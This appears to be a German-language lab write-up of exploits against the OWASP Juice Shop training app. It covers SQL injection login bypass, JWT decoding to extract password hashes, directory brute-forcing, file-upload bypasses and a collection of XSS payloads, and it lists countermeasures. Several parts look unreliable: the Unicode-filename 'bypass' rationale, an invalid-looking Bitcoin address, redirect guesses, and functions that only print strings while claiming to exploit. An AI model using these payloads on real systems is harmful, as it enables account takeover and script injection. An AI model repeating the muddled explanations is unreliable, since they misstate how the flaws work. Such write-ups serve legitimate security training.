# 🔓 Juice Shop Exploits - Detaillierte Lösungswege

## 1. SQL Injection - Admin Login Bypass

### 📝 Beschreibung
Umgehung der Login-Authentifizierung durch SQL Injection. Diese Schwachstelle ermöglicht es, sich ohne gültige Anmeldedaten als Administrator anzumelden.

### 🛠️ Exploit
```sql
Email: admin@juice-sh.op'--
Passwort: (beliebig)
```

### 💡 Erklärung
- Das `'--` beendet das SQL-Statement vorzeitig
- Der Rest der Query (Passwort-Überprüfung) wird als Kommentar ignoriert
- Resultierende Query: `SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = '...'`

---

## 2. JWT Token Dekodierung - Admin Passwort via localStorage

### 📝 Beschreibung
Eine fortgeschrittene Methode, um das Admin-Passwort durch Dekodierung des JWT-Tokens aus dem localStorage zu ermitteln. Der Token enthält verschlüsselte Benutzerinformationen, einschließlich des Admin-Passworts als MD5-Hash.

### 🔍 Schritt 1: JWT Token aus localStorage extrahieren

```javascript
// Nach dem Login als normaler User
const token = localStorage.getItem('token');
console.log('JWT Token:', token);
```

### 🔍 Schritt 2: JWT Token dekodieren

```javascript
// JWT besteht aus 3 Teilen: Header.Payload.Signature
const parts = token.split('.');
const payload = parts[1];

// Base64 dekodieren
const decodedPayload = atob(payload);
console.log('Decoded Payload:', decodedPayload);

// Als JSON parsen
const tokenData = JSON.parse(decodedPayload);
console.log('Token Data:', tokenData);
```

### 🔍 Schritt 3: Admin-Informationen extrahieren

```javascript
// Suche nach Admin-relevanten Daten im Token
console.log('User Data:', tokenData.data);

// Oft enthält der Token Informationen über alle User oder Admin-Hashes
// Beispiel für typische Token-Struktur:
/*
{
  "data": {
    "id": 1,
    "username": "admin",
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500", // MD5 Hash
    "role": "admin"
  }
}
*/
```

### 🔍 Schritt 4: MD5-Hash cracken

```javascript
// Gefundener MD5 Hash (Beispiel)
const adminHash = "0192023a7bbd73250516f069df18b500";
console.log('Admin MD5 Hash:', adminHash);

// Online MD5 Decoder verwenden oder lokale Tools:
// Hash entspricht oft: "admin123"
```

### 🛠️ Kompletter Exploit-Code

```javascript
// Vollständiger Workflow
function extractAdminPassword() {
    // 1. Token holen
    const token = localStorage.getItem('token');
    if (!token) {
        console.log('❌ Kein Token gefunden - erst einloggen!');
        return;
    }
    
    try {
        // 2. JWT dekodieren
        const parts = token.split('.');
        const payload = JSON.parse(atob(parts[1]));
        
        console.log('📋 JWT Payload:', payload);
        
        // 3. Admin-Daten suchen
        if (payload.data && payload.data.password) {
            console.log('🔑 Admin MD5 Hash gefunden:', payload.data.password);
            console.log('💡 Versuche den Hash zu cracken...');
            
            // Häufige Passwörter für MD5-Hashes in Juice Shop
            const commonPasswords = ['admin123', 'admin', 'password', '123456'];
            
            commonPasswords.forEach(pwd => {
                // Hinweis: In echter Umgebung würde man MD5 Libraries verwenden
                console.log(`🧪 Teste: ${pwd}`);
            });
        }
        
        // 4. Alternative: Suche in anderen Token-Bereichen
        console.log('🔍 Vollständige Token-Struktur:', JSON.stringify(payload, null, 2));
        
    } catch (error) {
        console.log('❌ Fehler beim Dekodieren:', error);
    }
}

// Exploit ausführen
extractAdminPassword();
```

### 💡 Erklärung

1. **JWT Structure**: JSON Web Tokens bestehen aus 3 Teilen (Header.Payload.Signature)
2. **Base64 Encoding**: Der Payload ist Base64-kodiert, nicht verschlüsselt
3. **Information Leakage**: Sensitive Daten wie Passwort-Hashes gehören nicht in JWTs
4. **MD5 Vulnerability**: MD5-Hashes sind unsicher und leicht zu cracken

### 🚨 Sicherheitslücke

- **Schwachstelle**: Sensitive Daten in JWT-Payload
- **Impact**: Vollständige Kompromittierung des Admin-Accounts
- **CVSS**: High (Administrative Privilegien)

### 🛡️ Gegenmaßnahmen

1. **Keine sensitiven Daten in JWTs** - Nur User-ID und Rollen
2. **Starke Passwort-Hashing** - bcrypt statt MD5
3. **Token-Verschlüsselung** - JWE statt JWS
4. **Kurze Token-Lebensdauer** - Automatisches Ablaufen

---

## 3. Directory Scanning - Versteckte Dateien finden

### 📝 Beschreibung
Automatisches Scannen der Webapplikation nach versteckten Verzeichnissen und Dateien.

### 🛠️ Befehl
```bash
gobuster dir -u http://localhost:3000 -w common.txt -x js,json,md,txt,pdf --exclude-length 80117
```

### 💡 Parameter-Erklärung
- `-u`: Target URL
- `-w`: Wordlist für Brute-Force
- `-x`: Dateierweiterungen zum Testen
- `--exclude-length`: Ignoriere Responses mit dieser Länge (reduziert False Positives)

---

## 4. Admin Route Discovery - JavaScript Analyse

### 📝 Beschreibung
Verschiedene Methoden zur Entdeckung versteckter Admin-Routen durch Analyse des Frontend-Codes.

### 🔍 METHODE 1: String-Suche in main.js

```javascript
fetch('http://localhost:3000/main.js')
.then(response => response.text())
.then(code => {
    console.log('=== SEARCHING FOR ROUTES IN MAIN.JS ===');

    // Verschiedene Suchpattern für Angular-Routen
    const patterns = [
        // Standard Angular Routing
        /when\(['"]([^'"]+)['"],/g,
        /path\s*:\s*['"]([^'"]+)['"]/g,
        /route\s*:\s*['"]([^'"]+)['"]/g,
        
        // Template URLs (geben Hints auf Routen)
        /templateUrl\s*:\s*['"]([^'"]+)['"]/g,
        
        // Hash-basierte Routen
        /#\/[a-zA-Z0-9\-_]+/g,
        
        // String literals mit "/" 
        /['"][\/][a-zA-Z0-9\-_]+['"]/g,
        
        // Angular Route Definitionen
        /\$routeProvider[^}]+/g,
        
        // Suche nach bekannten Wörtern
        /administration/g,
        /score-board/g,
        /dashboard/g,
        /admin/g
    ];
    
    patterns.forEach((pattern, index) => {
        const matches = code.match(pattern);
        if (matches && matches.length > 0) {
            console.log(`Pattern ${index} (${pattern}) found:`, [...new Set(matches)]);
        }
    });
    
    // Suche nach Strings die "admin" enthalten
    const adminMatches = code.match(/['"]\w*admin\w*['"]/gi);
    if (adminMatches) {
        console.log('Admin-related strings:', [...new Set(adminMatches)]);
    }
})
.catch(error => console.log('Error loading main.js:', error));
```

### 🔍 METHODE 2: Angular Route Discovery

```javascript
console.log('\n=== ANGULAR ROUTE DISCOVERY ===');
try {
    // Prüfe ob Angular verfügbar ist
    if (typeof angular !== 'undefined') {
        console.log('✅ Angular is available!');

        // Hole den $route Service
        const $route = angular.element(document.body).injector().get('$route');
        console.log('📋 All defined routes:');
        
        Object.keys($route.routes).forEach(route => {
            console.log(`🔗 ${route}`, $route.routes[route]);
        });
        
        // Zeige auch den Provider
        const $routeProvider = angular.element(document.body).injector().get('$route');
        console.log('Route configuration:', $routeProvider);
    } else {
        console.log('❌ Angular not found in global scope');
    }
} catch (error) {
    console.log('❌ Error accessing Angular routes:', error.message);

    // Alternative: Versuche verschiedene Angular-Zugriffswege
    try {
        const app = angular.element(document.querySelector('[ng-app]')).scope();
        console.log('Angular app scope:', app);
    } catch (e) {
        console.log('Could not find ng-app');
    }
}
```

### 🔍 METHODE 3: DOM-basierte Suche

```javascript
console.log('\n=== DOM-BASED SEARCH ===');

// Suche in der gesamten HTML-Quelle
const htmlSource = document.documentElement.outerHTML;

// Verschiedene Patterns für Routen-Hinweise
const domPatterns = [
    /#\/[a-zA-Z0-9\-_]+/g,           // Hash-basierte Routen
    /href=['"][^'"]*['"]/g,         // Standard href Attribute
    /ng-href=['"][^'"]*['"]/g,      // Angular ng-href
    /ui-sref=['"][^'"]*['"]/g       // UI-Router Referenzen
];

domPatterns.forEach((pattern, index) => {
    const matches = htmlSource.match(pattern);
    if (matches) {
        const uniqueMatches = [...new Set(matches)];
        console.log(`DOM Pattern ${index}:`, uniqueMatches.slice(0, 10)); // Zeige nur erste 10
    }
});

// Suche nach spezifischen Strings im DOM
const searchTerms = ['administration', 'admin', 'dashboard', 'panel', 'score-board'];
searchTerms.forEach(term => {
    if (htmlSource.toLowerCase().includes(term)) {
        console.log(`✅ Found "${term}" in DOM`);
    }
});
```

### 🔍 METHODE 4: Navigation Element Analysis

```javascript
console.log('\n=== NAVIGATION ANALYSIS ===');

// Finde alle Links und Navigation
const navElements = document.querySelectorAll('a, [ng-click], [ui-sref]');
console.log(`Found ${navElements.length} navigation elements`);

navElements.forEach((element, index) => {
    const href = element.getAttribute('href');
    const ngClick = element.getAttribute('ng-click');
    const uiSref = element.getAttribute('ui-sref');

    if (href && (href.includes('admin') || href.includes('#/'))) {
        console.log(`Nav ${index} href:`, href);
    }
    if (ngClick && ngClick.includes('admin')) {
        console.log(`Nav ${index} ng-click:`, ngClick);
    }
    if (uiSref) {
        console.log(`Nav ${index} ui-sref:`, uiSref);
    }
});
```

### 🔍 METHODE 5: Manual Testing der häufigsten Admin-Routen

```javascript
console.log('\n=== MANUAL ROUTE TESTING ===');

const commonAdminRoutes = [
    '/#/admin',
    '/#/administration',
    '/#/administrator',
    '/#/dashboard',
    '/#/panel',
    '/#/backend',
    '/#/manage',
    '/#/control',
    '/#/score-board',
    '/#/config',
    '/#/settings'
];

console.log('🧪 Test these routes manually:');
commonAdminRoutes.forEach(route => {
    console.log(`🔗 http://localhost:3000${route}`);
});
```

### 🔍 METHODE 6: API Endpoint Discovery

```javascript
console.log('\n=== API ENDPOINT DISCOVERY ===');

// Suche nach API-Endpunkten in JavaScript
fetch('http://localhost:3000/main.js')
.then(response => response.text())
.then(code => {
    const apiPatterns = [
        /\/api\/[^'"]+/g,      // API Endpoints
        /\/rest\/[^'"]+/g,     // REST Endpoints
        /http[s]?:\/\/[^'"]+/g // Externe URLs
    ];

    apiPatterns.forEach((pattern, index) => {
        const matches = code.match(pattern);
        if (matches) {
            console.log(`API Pattern ${index}:`, [...new Set(matches)].slice(0, 10));
        }
    });
});
```

### 🔍 METHODE 7: Local Storage & Session Storage Inspection

```javascript
console.log('\n=== STORAGE INSPECTION ===');

// Schaue was bereits im Storage ist
console.log('LocalStorage keys:', Object.keys(localStorage));
console.log('SessionStorage keys:', Object.keys(sessionStorage));

// Prüfe auf Token oder Route-Informationen
Object.keys(localStorage).forEach(key => {
    const value = localStorage.getItem(key);
    if (value.includes('admin') || value.includes('route')) {
        console.log(`Storage ${key}:`, value);
    }
});
```

### 🔍 METHODE 8: Angular-spezifische Objekte im Window

```javascript
console.log('\n=== AVAILABLE OBJECTS ===');
console.log('Window object keys containing "ng" or "angular":',
    Object.keys(window).filter(key =>
        key.toLowerCase().includes('ng') ||
        key.toLowerCase().includes('angular')
    )
);
```
### 📊 Ergebnisse der Route Discovery

Die Ausführung der obigen Scripts lieferte folgende Ergebnisse:

#### ✅ Gefundene Admin-Routen:
- `/#/administration` - Admin Panel
- `/#/score-board` - Score Board mit allen Challenges

#### ✅ Weitere interessante Routen:
```
path:"accounting"
path:"hacking-instructor"
path:"privacy-security"
path:"data-export"
path:"wallet-web3"
path:"web3-sandbox"
```

#### ✅ API Endpoints:
```
/api/Challenges
/api/Users
/api/Products
/rest/web3
/rest/user/authentication-details/
```

---

## 5. File Upload Bypass - PDF Validation umgehen

### 📝 Beschreibung
Die Juice Shop prüft bei File Uploads nur die Dateiendung, nicht den tatsächlichen Inhalt. Dies ermöglicht das Hochladen von beliebigen Dateien als PDFs.

### 🛠️ Methode 1: Einfache Umbenennung
```bash
# Erstelle beliebiges Dateiformat (z.B ein Script) und verändere die Endung in .pdf
mv malicious_script.sh malicious_script.pdf
```

### 🛠️ Methode 2: Magic Bytes Spoofing
Siehe Script: `ressources/scripts/fake_file_1_rename-extension.sh`
```bash
echo -e '%PDF-1.4\n<?xml version="1.0"?><root>bypass</root>' > bypass.pdf
```

### 🛠️ Methode 3: XML als PDF
Siehe Script: `ressources/scripts/fake_file_2_magic-bytes-spoofing.sh`
```bash
# Erstelle XML Datei
cat > test.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <message>This is a test XML file</message>
</root>
EOF

# Benenne zu .pdf um
mv test.xml test.pdf
```

### 🛠️ Methode 4: Unicode + URL-Encoding Bypass

```javascript
// Spezielle Unicode-Zeichen in Dateinamen verwenden
const unicodeFilename = "ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg";
console.log('Original Filename:', unicodeFilename);

// URL-Encoding anwenden
const encodedFilename = encodeURIComponent(unicodeFilename);
console.log('URL-Encoded:', encodedFilename);
// Ergebnis: %E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg
```

### 📝 Manuelle URL-Encoding Methode

```bash
# Original Dateiname mit Unicode-Zeichen
echo "ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg"

# URL-Encoded Version für Upload
echo "%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"
```

### 🔍 Exploit-Workflow

```javascript
// 1. Erstelle Datei mit Unicode-Namen
function createUnicodeBypass() {
    const originalName = "ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg";
    const encodedName = "%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg";
    
    console.log('🎯 Unicode File Upload Bypass:');
    console.log('Original:', originalName);
    console.log('Encoded:', encodedName);
    
    // 2. Verwende den encoded Namen beim File Upload
    // Dies kann Filter umgehen, die nur ASCII-Zeichen erwarten
    return encodedName;
}

// 3. Upload-Simulation
function simulateUpload() {
    const filename = createUnicodeBypass();
    
    // Simuliere FormData für File Upload
    console.log('📤 Uploading file with name:', filename);
    console.log('🔓 Bypass reason: Unicode + Special chars + URL encoding');
}

simulateUpload();
```

### 💡 Warum funktioniert dieser Bypass?

1. **Unicode-Zeichen**: `ᓚᘏᗢ` (Kanadische Silbenschrift) verwirrt Parser
2. **Sonderzeichen**: `#` kann als Fragment-Identifier interpretiert werden
3. **URL-Encoding**: Versteckt die wahre Struktur des Dateinamens
4. **Lange Timestamps**: `1572600969477` (Unix-Timestamp) kann Buffer-Checks umgehen
5. **Mixed Content**: Kombination aus Unicode, ASCII und Zahlen

### 🔍 Technische Analyse

```javascript
// Dekodierung des Unicode-Strings
function analyzeUnicodeBypass() {
    const encoded = "%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg";
    const decoded = decodeURIComponent(encoded);
    
    console.log('🔬 Unicode Analysis:');
    console.log('ᓚ = U+14DA (Canadian Syllabics LA)');
    console.log('ᘏ = U+160F (Canadian Syllabics WEST-CREE LWE)');
    console.log('ᗢ = U+15E2 (Canadian Syllabics LAA)');
    
    // Timestamp-Analyse
    const timestamp = 1572600969477;
    const date = new Date(timestamp);
    console.log('📅 Timestamp:', date.toISOString()); // 2019-11-01
    
    return {
        original: decoded,
        encoded: encoded,
        unicodeChars: ['ᓚ', 'ᘏ', 'ᗢ'],
        timestamp: timestamp
    };
}
```

### 🚨 Sicherheitsimplikationen

- **Filename Injection**: Kann zu Path Traversal führen
- **Parser Confusion**: Unicode kann Security-Filter umgehen
- **Encoding Attacks**: Doppelte Enkodierung möglich
- **Buffer Overflow**: Lange Dateinamen können Puffer überlasten

### 💡 Warum funktioniert das?
- Die Anwendung prüft nur die Dateiendung (.pdf)
- Der tatsächliche Dateiinhalt (MIME-Type) wird nicht validiert
- Magic Bytes werden nicht überprüft
- **Unicode-Filter fehlen**: Keine Normalisierung von Unicode-Zeichen
- **URL-Decoding Schwächen**: Inkonsistente Behandlung von encodierten Strings

---

## 6. DOM XSS - Cross-Site Scripting Angriffe

### 📝 Beschreibung
DOM-basierte XSS-Schwachstellen entstehen, wenn JavaScript unsichere Benutzereingaben direkt in das DOM schreibt. Die Juice Shop ist anfällig für verschiedene XSS-Payloads.

### 🔍 Methode 1: Klassischer iframe XSS

```javascript
// Einfacher iframe-basierter XSS Payload
<iframe src="javascript:alert(`xss`)">
```

### 📝 Wie funktioniert's?

1. **Eingabefeld finden**: Suche nach Feldern, die HTML akzeptieren (z.B. Suchfeld, Kommentare)
2. **Payload einfügen**: Gib den iframe-Code ein
3. **Ausführung**: Der Browser führt das JavaScript im iframe aus

### 🛠️ Technische Erklärung

```javascript
// Was passiert im Hintergrund:
// 1. Unsichere DOM-Manipulation
element.innerHTML = userInput; // GEFÄHRLICH!

// 2. Der iframe wird gerendert
// <iframe src="javascript:alert(`xss`)">

// 3. JavaScript im src-Attribut wird ausgeführt
// javascript: Protocol Handler löst Code-Ausführung aus
```

### 🔍 Methode 2: Bonus Payload - SoundCloud iframe

```html
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" 
        src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true">
</iframe>
```

### 🎯 Warum funktioniert dieser Payload?

1. **Legitimer Content**: SoundCloud-Player sieht harmlos aus
2. **Autoplay**: Musik startet automatisch = Beweis für XSS
3. **Visuelle Bestätigung**: Großer, sichtbarer iframe
4. **Social Engineering**: Benutzer denken es ist gewollter Content

### 🔍 Exploit-Analyse

```javascript
// Schritt-für-Schritt Analyse des Bonus Payloads
function analyzePayload() {
    const payload = {
        // iframe Attribute
        width: "100%",           // Volle Breite
        height: "166",           // Standard SoundCloud Höhe
        scrolling: "no",         // Kein Scrolling
        frameborder: "no",       // Kein Rahmen
        allow: "autoplay",       // Autoplay erlaubt
        
        // SoundCloud API Parameter
        src: {
            baseUrl: "https://w.soundcloud.com/player/",
            params: {
                url: "https://api.soundcloud.com/tracks/771984076",
                color: "#ff5500",     // Orange
                auto_play: true,      // WICHTIG: Automatisches Abspielen
                hide_related: false,
                show_comments: true,
                show_user: true,
                show_reposts: false,
                show_teaser: true
            }
        }
    };
    
    console.log('🎵 SoundCloud XSS Payload:', payload);
    return payload;
}
```

### 💡 Verschiedene XSS-Vektoren testen

```javascript
// Sammlung von XSS Payloads für Juice Shop
const xssPayloads = [
    // 1. Classic Alert
    `<script>alert('XSS')</script>`,
    
    // 2. IMG Tag
    `<img src=x onerror="alert('XSS')">`,
    
    // 3. SVG
    `<svg onload="alert('XSS')">`,
    
    // 4. iframe JavaScript
    `<iframe src="javascript:alert('XSS')">`,
    
    // 5. Event Handler
    `<body onload="alert('XSS')">`,
    
    // 6. Data URI
    `<object data="data:text/html,<script>alert('XSS')</script>">`,
    
    // 7. Style Tag
    `<style>@import'javascript:alert("XSS")';</style>`,
    
    // 8. Meta Refresh
    `<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">`,
    
    // 9. SoundCloud Bonus
    `<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>`
];

// Test-Funktion
function testXSS() {
    console.log('🧪 XSS Payloads zum Testen:');
    xssPayloads.forEach((payload, index) => {
        console.log(`${index + 1}. ${payload.substring(0, 50)}...`);
    });
}
```

### 🚨 DOM XSS Locations in Juice Shop

```javascript
// Typische verwundbare Stellen
const vulnerableLocations = [
    {
        location: "Search Box",
        url: "/#/search?q=PAYLOAD",
        method: "GET Parameter"
    },
    {
        location: "Product Reviews",
        url: "/#/product/*/reviews",
        method: "POST Body"
    },
    {
        location: "Contact Form",
        url: "/#/contact",
        method: "Form Input"
    },
    {
        location: "User Profile",
        url: "/#/profile",
        method: "Profile Fields"
    }
];

console.log('📍 Verwundbare Locations:', vulnerableLocations);
```

### 🛡️ Sicherheitslücke verstehen

```javascript
// UNSICHER - So macht es Juice Shop
function unsafeRender(userInput) {
    // Direkte DOM-Manipulation ohne Sanitization
    document.getElementById('output').innerHTML = userInput; // ❌ GEFÄHRLICH!
}

// SICHER - So sollte es sein
function safeRender(userInput) {
    // Option 1: textContent verwenden
    document.getElementById('output').textContent = userInput; // ✅ SICHER
    
    // Option 2: Input sanitizen
    const sanitized = DOMPurify.sanitize(userInput); // ✅ Mit DOMPurify
    document.getElementById('output').innerHTML = sanitized;
    
    // Option 3: Content Security Policy
    // Header: Content-Security-Policy: script-src 'self'
}
```

### 💡 Warum funktionieren diese XSS-Angriffe?

1. **Fehlende Input-Validierung**: Keine Filterung von HTML/JavaScript
2. **Unsichere DOM-Manipulation**: `innerHTML` statt `textContent`
3. **Keine Content Security Policy**: Inline-Scripts erlaubt
4. **Framework-Schwächen**: Angular-Sanitization umgangen
5. **Vertrauen in User-Input**: Keine Server-seitige Validierung

### 🎯 Impact der XSS-Schwachstelle

- **Session Hijacking**: Token/Cookie Diebstahl möglich
- **Phishing**: Fake-Login Forms einfügen
- **Defacement**: Seiteninhalte verändern
- **Malware Distribution**: Bösartige Scripts laden
- **Keylogging**: Tastatureingaben aufzeichnen

---

## 7. Outdated Allowlist - BTC Address Discovery via Angular Routing

### 📝 Beschreibung
Durch die Analyse der Angular-Routen können veraltete Cryptocurrency-Adressen entdeckt werden, die nicht mehr beworben werden, aber noch in der Allowlist stehen.

### 🔍 Schritt 1: Angular Route Discovery aus Abschnitt 4

```javascript
// Verwende die Route Discovery Methoden aus Abschnitt 4
fetch('http://localhost:3000/main.js')
.then(response => response.text())
.then(code => {
    // Suche speziell nach Crypto-bezogenen Routen
    const cryptoPatterns = [
        /btc/gi,
        /bitcoin/gi,
        /crypto/gi,
        /wallet/gi,
        /donation/gi,
        /redirect/gi
    ];
    
    cryptoPatterns.forEach((pattern, index) => {
        const matches = code.match(pattern);
        if (matches) {
            console.log(`🔍 Crypto Pattern ${index}:`, [...new Set(matches)]);
        }
    });
});
```

### 🔍 Schritt 2: Redirect-Parameter analysieren

```javascript
// Suche nach redirect-fähigen Routen
function findRedirectRoutes() {
    // Typische Redirect-Parameter in Angular
    const redirectParams = [
        'redirect',
        'to',
        'url',
        'target',
        'destination'
    ];
    
    // Teste verschiedene Kombinationen
    const testUrls = [
        '/#/redirect?to=',
        '/#/redirect?url=',
        '/#/?redirect=',
        '/#/wallet?to=',
        '/#/donation?to='
    ];
    
    console.log('🧪 Test these redirect URLs:');
    testUrls.forEach(url => {
        console.log(`${url}[CRYPTO_ADDRESS]`);
    });
}
```

### 🔍 Schritt 3: BTC Address Discovery

```javascript
// Automatische BTC-Adresse Entdeckung
function discoverBTCAddresses() {
    // Bitcoin-Adressen haben spezifische Formate
    const btcPatterns = [
        /1[A-HJ-NP-Z0-9]{25,34}/g,    // Legacy (P2PKH)
        /3[A-HJ-NP-Z0-9]{25,34}/g,    // SegWit (P2SH)  
        /bc1[A-HJ-NP-Z0-9]{25,62}/g   // Bech32
    ];
    
    // Durchsuche JavaScript-Code nach BTC-Adressen
    fetch('http://localhost:3000/main.js')
    .then(response => response.text())
    .then(code => {
        console.log('🔍 Searching for Bitcoin addresses...');
        
        btcPatterns.forEach((pattern, index) => {
            const matches = code.match(pattern);
            if (matches) {
                console.log(`₿ Bitcoin addresses found (Pattern ${index}):`, matches);
                
                // Teste jede gefundene Adresse
                matches.forEach(address => {
                    testRedirectToAddress(address);
                });
            }
        });
    });
}

// Teste Redirect zu BTC-Adresse
function testRedirectToAddress(btcAddress) {
    const redirectUrls = [
        `/#/redirect?to=${btcAddress}`,
        `/#/redirect?url=${btcAddress}`,
        `/#/?redirect=${btcAddress}`,
        `/#/donation?to=${btcAddress}`
    ];
    
    console.log(`🧪 Testing redirects for: ${btcAddress}`);
    redirectUrls.forEach(url => {
        console.log(`🔗 Try: http://localhost:3000${url}`);
    });
}
```

### 🛠️ Manuelle Methode

```bash
# 1. Finde alle Routen mit redirect-Parametern
curl -s http://localhost:3000/main.js | grep -i "redirect\|to\|url"

# 2. Suche nach Bitcoin-Adressen im JavaScript
curl -s http://localhost:3000/main.js | grep -o -E "1[A-HJ-NP-Z0-9]{25,34}|3[A-HJ-NP-Z0-9]{25,34}|bc1[A-HJ-NP-Z0-9]{25,62}"

# 3. Teste gefundene Adressen manuell
# Beispiel für typische BTC-Adresse:
echo "http://localhost:3000/#/redirect?to=1AbKfgvw9psQ41NuW8w"
```

### 🔍 Exploit Workflow

```javascript
// Vollständiger Workflow für BTC Address Discovery
async function exploitOutdatedAllowlist() {
    console.log('🕵️ Starting Outdated Allowlist Exploit...');
    
    try {
        // 1. Lade main.js
        const response = await fetch('http://localhost:3000/main.js');
        const jsCode = await response.text();
        
        // 2. Suche nach Bitcoin-Adressen
        const btcRegex = /1[A-HJ-NP-Z0-9]{25,34}/g;
        const foundAddresses = jsCode.match(btcRegex) || [];
        
        console.log(`₿ Found ${foundAddresses.length} potential BTC addresses:`);
        foundAddresses.forEach((addr, index) => {
            console.log(`${index + 1}. ${addr}`);
        });
        
        // 3. Teste Redirect-Parameter
        const redirectParams = ['to', 'url', 'redirect', 'target'];
        const baseUrls = ['/#/redirect', '/#/', '/#/donation'];
        
        for (const address of foundAddresses) {
            for (const baseUrl of baseUrls) {
                for (const param of redirectParams) {
                    const testUrl = `${baseUrl}?${param}=${address}`;
                    console.log(`🧪 Test: http://localhost:3000${testUrl}`);
                    
                    // In echter Anwendung würdest du hier eine Anfrage senden
                    // und prüfen, ob der Redirect funktioniert
                }
            }
        }
        
        console.log('✅ Exploit completed! Check URLs manually.');
        
    } catch (error) {
        console.error('❌ Error:', error);
    }
}

// Starte den Exploit
exploitOutdatedAllowlist();
```

### 💡 Warum funktioniert dieser Exploit?

1. **Veraltete Allowlist**: Alte BTC-Adressen sind noch in der Redirect-Allowlist
2. **Angular Router Schwäche**: Parameter-basierte Redirects ohne strikte Validierung
3. **Information Disclosure**: BTC-Adressen im Client-Code gespeichert
4. **Legacy Code**: Nicht entfernte, aber inaktive Donation-Links

### 🔍 Typische gefundene BTC-Adressen

```javascript
// Beispiele für BTC-Adressen die typischerweise gefunden werden
const exampleAddresses = [
    "1AbKfgvw9psQ41NuW8w",      // Beispiel Legacy-Adresse
    "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy", // SegWit-Adresse
    "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"  // Bech32-Adresse
];

// Teste diese in verschiedenen Redirect-Szenarien
exampleAddresses.forEach(addr => {
    console.log(`🔗 http://localhost:3000/#/redirect?to=${addr}`);
    console.log(`🔗 http://localhost:3000/#/?redirect=${addr}`);
});
```

### 🚨 Sicherheitslücke

- **Schwachstelle**: Unvollständige Allowlist-Wartung
- **Impact**: Information Disclosure von Crypto-Adressen
- **CVSS**: Medium (Sensitive Information Exposure)

### 🛡️ Gegenmaßnahmen

1. **Allowlist Maintenance**: Regelmäßige Überprüfung und Bereinigung
2. **Redirect Validation**: Strikte Whitelist für erlaubte Redirect-Ziele
3. **Code Cleanup**: Entfernung alter/unused Routes und Adressen
4. **Parameter Validation**: Eingabe-Validierung für alle Router-Parameter

---

## 📚 Zusammenfassung der Schwachstellen

1. **SQL Injection**: Fehlende Input-Validierung
2. **JWT Token Exposure**: Sensitive Daten in localStorage
3. **Information Disclosure**: Exposed Routes in JavaScript
4. **Access Control**: Versteckte Admin-Bereiche ohne Authentifizierung
5. **File Upload**: Unzureichende Dateivalidierung
6. **DOM XSS**: Unsichere DOM-Manipulation und fehlende Sanitization
7. **Outdated Allowlist**: Veraltete Crypto-Adressen in Redirect-Allowlist

## 🛡️ Empfohlene Gegenmaßnahmen

1. **SQL Injection**: Prepared Statements verwenden
2. **JWT Security**: Keine sensitiven Daten in Tokens, sichere Speicherung
3. **Route Protection**: Server-seitige Authentifizierung für Admin-Routen
4. **File Validation**: MIME-Type und Magic Bytes prüfen
5. **Security Headers**: CSP, X-Frame-Options, etc. implementieren
6. **XSS Prevention**: Input-Sanitization, textContent statt innerHTML, DOMPurify
7. **Allowlist Management**: Regelmäßige Bereinigung veralteter Redirect-Ziele

